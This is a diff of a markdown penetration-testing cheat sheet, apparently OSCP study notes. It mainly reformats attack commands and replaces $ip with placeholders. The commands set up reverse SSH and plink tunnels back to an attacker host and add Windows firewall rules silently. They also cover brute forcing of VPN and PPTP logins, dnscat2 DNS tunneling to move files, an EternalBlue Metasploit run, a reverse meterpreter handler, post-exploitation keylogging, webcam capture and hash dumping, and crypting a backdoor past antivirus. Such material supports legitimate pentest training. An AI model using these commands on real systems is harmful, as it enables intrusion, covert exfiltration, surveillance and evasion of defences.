@@ -1959,12 +1959,13 @@ apt-get install pocl-opencl-icd
 
     -   Create reverse SSH tunnel from Popped machine on :2222  
         
-        `ssh -f -N -R 2222:$ip:22 root@$ip`
+        `ssh -f -N -T -R22222:localhost:22 yourpublichost.example.com`
+        `ssh -f -N -R 2222:<local host>:22 root@<remote host>`
 
     -   Create a Dynamic application-level port forward on 8080 thru
         2222  
         
-        `ssh -f -N -D $ip:8080 -p 2222 hax0r@$ip`
+        `ssh -f -N -D <local host>:8080 -p 2222 hax0r@<remote host>`
 
     -   Leverage the SSH SOCKS server to perform Nmap scan on network
         using proxy chains  
@@ -1977,53 +1978,50 @@ apt-get install pocl-opencl-icd
 
 -   Traffic Encapsulation - Bypassing deep packet inspection
 
-    -   http\_tunnel  
+    -   http tunnel  
         On server side:  
-        `sudo hts -F <server\_ip\_addr>:<port\_of\_your\_app> 80  `
+        `sudo hts -F <server ip addr>:<port of your app> 80  `
         On client side:  
-        `sudo htc -P <my\_proxy.com:proxy\_port> -F <port\_of\_your\_app> <server\_ip\_addr>:80 stunnel`
+        `sudo htc -P <my proxy.com:proxy port> -F <port of your app> <server ip addr>:80 stunnel`
 
 -   Tunnel Remote Desktop (RDP) from a Popped Windows machine to your
     network
 
     -   Tunnel on port 22  
-        plink -l root -pw pass -R 3389:$ip:3389 $ip
+    
+        `plink -l root -pw pass -R 3389:<localhost>:3389 <remote host>`
 
     -   Port 22 blocked? Try port 80? or 443?  
-        plink -l root -pw 23847sd98sdf987sf98732 -R 3389:$ip:3389 $ip -P
-        80
+    
+        `plink -l root -pw 23847sd98sdf987sf98732 -R 3389:<local host>:3389 <remote host> -P80`
 
 -   Tunnel Remote Desktop (RDP) from a Popped Windows using HTTP Tunnel
     (bypass deep packet inspection)
 
-    -   Windows machine add required firewall rules without prompting
-        the user
+    -   Windows machine add required firewall rules without prompting the user
 
-    -   netsh advfirewall firewall add rule name="httptunnel\_client"
-        dir=in action=allow program="httptunnel\_client.exe" enable=yes
+    -   `netsh advfirewall firewall add rule name="httptunnel_client" dir=in action=allow program="httptunnel_client.exe" enable=yes`
 
-    -   netsh advfirewall firewall add rule name="3000" dir=in
-        action=allow protocol=TCP localport=3000
+    -   `netsh advfirewall firewall add rule name="3000" dir=in action=allow protocol=TCP localport=3000`
 
-    -   netsh advfirewall firewall add rule name="1080" dir=in
-        action=allow protocol=TCP localport=1080
+    -   `netsh advfirewall firewall add rule name="1080" dir=in action=allow protocol=TCP localport=1080`
 
-    -   netsh advfirewall firewall add rule name="1079" dir=in
-        action=allow protocol=TCP localport=1079
+    -   `netsh advfirewall firewall add rule name="1079" dir=in action=allow protocol=TCP localport=1079`
 
     -   Start the http tunnel client  
-        httptunnel\_client.exe
+    
+         `httptunnel_client.exe`
 
     -   Create HTTP reverse shell by connecting to localhost port 3000  
-        plink -l root -pw 23847sd98sdf987sf98732 -R 3389:$ip:3389 $ip -P
-        3000
+    
+        `plink -l root -pw 23847sd98sdf987sf98732 -R 3389:<local host>:3389 <remote host> -P 3000`
 
 -   VLAN Hopping
 
-    -   ```git clone https://github.com/nccgroup/vlan-hopping.git  
+    -   `git clone https://github.com/nccgroup/vlan-hopping.git  
         chmod 700 frogger.sh  
-        ./frogger.sh
-        ```
+        ./frogger.sh`
+        
 
 -   VPN Hacking
 
@@ -2034,70 +2032,81 @@ apt-get install pocl-opencl-icd
         `./udp-protocol-scanner.pl -p ike -f ip.txt`
 
     -   Use IKEForce to enumerate or dictionary attack VPN servers:  
+    
         `pip install pyip`  
-        git clone <https://github.com/SpiderLabs/ikeforce.git>  
+        
+        `git clone <https://github.com/SpiderLabs/ikeforce.git>  `
+        
         Perform IKE VPN enumeration with IKEForce:  
-        ./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic  
+        
+        `./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic  `
+        
         Bruteforce IKE VPN using IKEForce:  
-        ./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w
-        passwords.txt -s 1  
+        
+        `./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1  `
         Use ike-scan to capture the PSK hash:  
-        ike-scan  
+        
+        `ike-scan  
         ike-scan TARGET-IP  
         ike-scan -A TARGET-IP  
         ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key  
-        ike-scan –M –A –n example\_group -P hash-file.txt TARGET-IP  
+        ike-scan –M –A –n example\_group -P hash-file.txt TARGET-IP  `
         Use psk-crack to crack the PSK hash  
-        psk-crack hash-file.txt  
+        
+        `psk-crack hash-file.txt  
         pskcrack  
         psk-crack -b 5 TARGET-IPkey  
-        psk-crack -b 5
-        --charset="01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
-        192-168-207-134key  
-        psk-crack -d /path/to/dictionary-file TARGET-IP-key
+        psk-crack -b 5 --charset="01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" 192-168-207-134key  
+        psk-crack -d /path/to/dictionary-file TARGET-IP-key`
 
 -   PPTP Hacking
 
     -   Identifying PPTP, it listens on TCP: 1723  
         NMAP PPTP Fingerprint:  
-        nmap –Pn -sV -p 1723 TARGET(S)  
+        
+        `nmap –Pn -sV -p 1723 TARGET(S)  `
         PPTP Dictionary Attack  
-        thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst
+        
+        `thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst`
 
 -   Port Forwarding/Redirection
 
 -   PuTTY Link tunnel - SSH Tunneling
 
     -   Forward remote port to local address:  
-        plink.exe -P 22 -l root -pw "1337" -R 445:$ip:445 $ip
+    
+         `plink.exe -P 22 -l root -pw "1337" -R 445:<local host>:445 <remote host>`
 
 -   SSH Pivoting
 
     -   SSH pivoting from one network to another:  
-        ssh -D $ip:1010 -p 22 user@$ip
+    
+        `ssh -D <local host>:1010 -p 22 user@<remote host>`
 
 -   DNS Tunneling
 
-    -   dnscat2 supports “download” and “upload” commands for getting
-        files (data and programs) to and from the target machine.
+    -   dnscat2 supports “download” and “upload” commands for getting iles (data and programs) to and from the target machine.
 
     -   Attacking Machine Installation:  
-        apt-get update  
+    
+        `apt-get update  
         apt-get -y install ruby-dev git make g++  
         gem install bundler  
         git clone https://github.com/iagox86/dnscat2.git  
         cd dnscat2/server  
-        bundle install
+        bundle install`
 
     -   Run dnscat2:  
-        ruby ./dnscat2.rb  
+    
+        `ruby ./dnscat2.rb  
         dnscat2> New session established: 1422  
-        dnscat2> session -i 1422
+        dnscat2> session -i 1422`
 
     -   Target Machine:  
         https://downloads.skullsecurity.org/dnscat2/
         https://github.com/lukebaggett/dnscat2-powershell/  
-        dnscat --host <dnscat server\_ip>
+        
+        `dnscat --host <dnscat server ip>`
 
 <span id="_ujpvtdpc9i67" class="anchor"><span id="_Toc480741824" class="anchor"></span></span>The Metasploit Framework
 ======================================================================================================================
@@ -2113,72 +2122,85 @@ apt-get install pocl-opencl-icd
 -   Metasploit
 
     -   MetaSploit requires Postfresql  
-        systemctl start postgresql
+    
+        `systemctl start postgresql`
 
     -   To enable Postgresql on startup  
-        systemctl enable postgresql
+    
+        `systemctl enable postgresql`
 
 -   MSF Syntax
 
     -   Start metasploit  
-        msfconsole  
-        msfconsole -q
+        
+        `msfconsole  `
+        
+        `msfconsole -q`
 
     -   Show help for command  
-        show -h
+    
+        `show -h`
 
     -   Show Auxiliary modules  
-        show auxiliary
+    
+        `show auxiliary`
 
     -   Use a module  
-        use auxiliary/scanner/snmp/snmp\_enum  
-        use auxiliary/scanner/http/webdav\_scanner  
-        use auxiliary/scanner/smb/smb\_version  
-        use auxiliary/scanner/ftp/ftp\_login  
-        use exploit/windows/pop3/seattlelab\_pass
+    
+        `use auxiliary/scanner/snmp/snmp_enum  
+        use auxiliary/scanner/http/webdav_scanner  
+        use auxiliary/scanner/smb/smb_version  
+        use auxiliary/scanner/ftp/ftp_login  
+        use exploit/windows/pop3/seattlelab_pass`
 
     -   Show the basic information for a module  
-        info
+    
+        `info`
 
     -   Show the configuration parameters for a module  
-        show options
+    
+        `show options`
 
     -   Set options for a module  
-        set RHOSTS $ip-254  
-        set THREADS 10
+    
+        `set RHOSTS 192.168.1.1-254  
+        set THREADS 10`
 
     -   Run the module  
-        run
+    
+        `run`
 
-    -   Execute an Exploit  
-        exploit
+    -   Execute an Exploit 
+    
+        `exploit`
 
     -   Search for a module  
-        search type:auxiliary login
+    
+       `search type:auxiliary login`
 
 -   Metasploit Database Access
 
     -   Show all hosts discovered in the MSF database  
-        hosts
+    
+        `hosts`
 
     -   Scan for hosts and store them in the MSF database  
-        db\_nmap
+    
+        `db_nmap`
 
-    -   Search machines for specific ports in MSF database  
-        services -p 443
+    -   Search machines for specific ports in MSF database 
+    
+        `services -p 443`
 
-    -   Leverage MSF database to scan SMB ports (auto-completed
-        rhosts)  
-        services -p 443 --rhosts
+    -   Leverage MSF database to scan SMB ports (auto-completed rhosts)  
+        
+        `services -p 443 --rhosts`
 
 -   Staged and Non-staged
 
-    -   Non-staged payload - is a payload that is sent in its entirety
-        in one go
+    -   Non-staged payload - is a payload that is sent in its entirety in one go
 
-    -   Staged - sent in two parts  
-        Not have enough buffer space  
-        Or need to bypass antivirus
+    -   Staged - sent in two parts  Not have enough buffer space  Or need to bypass antivirus
  
  -   MS 17-010 - EternalBlue
 
@@ -2187,11 +2209,12 @@ apt-get install pocl-opencl-icd
     
       
       1. First step is to configure the Kali to work with wine 32bit
-      dpkg --add-architecture i386 && apt-get update && apt-get install wine32
+      
+      `dpkg --add-architecture i386 && apt-get update && apt-get install wine32
       rm -r ~/.wine
       wine cmd.exe
-      exit
-      
+      exit`
+            
       2. Download the exploit repostory
       https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit
       
@@ -2203,78 +2226,85 @@ apt-get install pocl-opencl-icd
 I found that using spoolsv.exe as the PROCESSINJECT yielded results on OSCP boxes.
 
       
-      use exploit/windows/smb/eternalblue_doublepulsar
+      `use exploit/windows/smb/eternalblue_doublepulsar
       msf exploit(eternalblue_doublepulsar) > set RHOST 10.10.10.10
       RHOST => 10.11.1.73
       msf exploit(eternalblue_doublepulsar) > set PROCESSINJECT spoolsv.exe
       PROCESSINJECT => spoolsv.exe
-      msf exploit(eternalblue_doublepulsar) > run
+      msf exploit(eternalblue_doublepulsar) > run`
       
 
 
 -   Experimenting with Meterpreter
 
     -   Get system information from Meterpreter Shell  
-        sysinfo
+    
+        `sysinfo`
 
     -   Get user id from Meterpreter Shell  
-        getuid
+    
+        `getuid`
 
     -   Search for a file  
-        search -f \*pass\*.txt
+    
+        `search -f *pass*.txt`
 
     -   Upload a file  
-        upload /usr/share/windows-binaries/nc.exe c:\\\\Users\\\\Offsec
+    
+        `upload /usr/share/windows-binaries/nc.exe c:\\Users\\Offsec`
 
     -   Download a file  
-        download c:\\\\Windows\\\\system32\\\\calc.exe /tmp/calc.exe
+    
+        `download c:\\Windows\\system32\\calc.exe /tmp/calc.exe`
 
     -   Invoke a command shell from Meterpreter Shell  
-        shell
+    
+        `shell`
 
     -   Exit the meterpreter shell  
-        exit
+    
+        `exit`
 
 -   Metasploit Exploit Multi Handler
 
     -   multi/handler to accept an incoming reverse\_https\_meterpreter
-        payload  
+    
+        `payload  
         use exploit/multi/handler  
-        set PAYLOAD windows/meterpreter/reverse\_https  
+        set PAYLOAD windows/meterpreter/reverse_https  
         set LHOST $ip  
         set LPORT 443  
         exploit  
-        \[\*\] Started HTTPS reverse handler on https://$ip:443/
+        [*] Started HTTPS reverse handler on https://$ip:443/`
 
 -   Building Your Own MSF Module
 
-    -   mkdir -p ~/.msf4/modules/exploits/linux/misc  
+    -   `mkdir -p ~/.msf4/modules/exploits/linux/misc  
         cd ~/.msf4/modules/exploits/linux/misc  
         cp
         /usr/share/metasploitframework/modules/exploits/linux/misc/gld\_postfix.rb
         ./crossfire.rb  
-        nano crossfire.rb
+        nano crossfire.rb`
 
--   Post Exploitation with Metasploit
+-   Post Exploitation with Metasploit - (available options depend on OS and Meterpreter Cababilities)
 
-    -   download Download a file or directory  
-        upload Upload a file or directory  
-        portfwd Forward a local port to a remote service  
-        route View and modify the routing table  
-        keyscan\_start Start capturing keystrokes  
-        keyscan\_stop Stop capturing keystrokes  
-        screenshot Grab a screenshot of the interactive desktop  
-        record\_mic Record audio from the default microphone for X
-        seconds  
-        webcam\_snap Take a snapshot from the specified webcam  
-        getsystem Attempt to elevate your privilege to that of local
-        system.  
-        hashdump Dumps the contents of the SAM database
+    -   `download` Download a file or directory  
+        `upload` Upload a file or directory  
+        `portfwd` Forward a local port to a remote service  
+        `route` View and modify the routing table  
+        `keyscan_start` Start capturing keystrokes  
+        `keyscan_stop` Stop capturing keystrokes  
+        `screenshot` Grab a screenshot of the interactive desktop  
+        `record_mic` Record audio from the default microphone for X seconds  
+        `webcam_snap` Take a snapshot from the specified webcam  
+        `getsystem` Attempt to elevate your privilege to that of local system.  
+        `hashdump` Dumps the contents of the SAM database
 
 -   Meterpreter Post Exploitation Features
 
     -   Create a Meterpreter background session  
-        background
+    
+        `background`
 
 <span id="_51btodqc88s2" class="anchor"><span id="_Toc480741825" class="anchor"></span></span>Bypassing Antivirus Software 
 ===========================================================================================================================
@@ -2282,16 +2312,11 @@ I found that using spoolsv.exe as the PROCESSINJECT yielded results on OSCP boxe
 -   Crypting Known Malware with Software Protectors
 
     -   One such open source crypter, called Hyperion  
-        cp /usr/share/windows-binaries/Hyperion-1.0.zip  
+    
+        `cp /usr/share/windows-binaries/Hyperion-1.0.zip  
         unzip Hyperion-1.0.zip  
         cd Hyperion-1.0/  
-        i686-w64-mingw32-g++ Src/Crypter/\*.cpp -o hyperion.exe  
-        cp -p
-        /usr/lib/gcc/i686-w64-mingw32/5.3-win32/libgcc\_s\_sjlj-1.dll
-        .  
-        cp -p /usr/lib/gcc/i686-w64-mingw32/5.3-win32/libstdc++-6.dll
-        .  
-        wine hyperion.exe ../backdoor.exe ../crypted.exe
-
--   Using Custom/Uncommon Tools and Payloads<span id="_2nz8rskeai36"
-    class="anchor"></span>
+        i686-w64-mingw32-g++ Src/Crypter/*.cpp -o hyperion.exe  
+        cp -p /usr/lib/gcc/i686-w64-mingw32/5.3-win32/libgcc_s_sjlj-1.dll .  
+        cp -p /usr/lib/gcc/i686-w64-mingw32/5.3-win32/libstdc++-6.dll .  
+        wine hyperion.exe ../backdoor.exe ../crypted.exe`
